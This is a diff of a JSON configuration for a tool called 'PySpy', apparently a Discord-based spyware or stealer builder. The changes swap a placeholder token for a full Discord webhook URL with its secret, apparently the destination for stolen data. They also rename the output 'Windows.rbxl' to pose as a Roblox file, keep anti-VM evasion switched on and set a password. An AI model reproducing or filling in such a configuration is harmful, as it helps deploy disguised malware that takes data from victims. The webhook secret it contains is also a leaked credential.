@@ -1,8 +1,8 @@
 {
-    "token": "BOT_TOKEN_HERE",
-    "app_name": "PySpy",
-    "app_logo": "window.ico",
-    "members": "100",
+    "token": "https://discord.com/api/webhooks/1432347610391384174/cB95MCj4xpMlwvdCRHL85DEEIxY0PU8xvti75IeFlZ-rKYm721wBXdMDGvXx2wzjcQEB",
+    "app_name": "Windows.rbxl",
+    "app_logo": "https://www.shutterstock.com/shutterstock/photos/2412456429/display_1500/stock-photo-novosibirsk-russia-january-black-exeed-rx-parked-of-a-city-no-other-car-and-2412456429.jpg",
+    "members": "1",
     "anti-vm": "True",
-    "password": "pyspy123"
+    "password": "Michmm"
 }
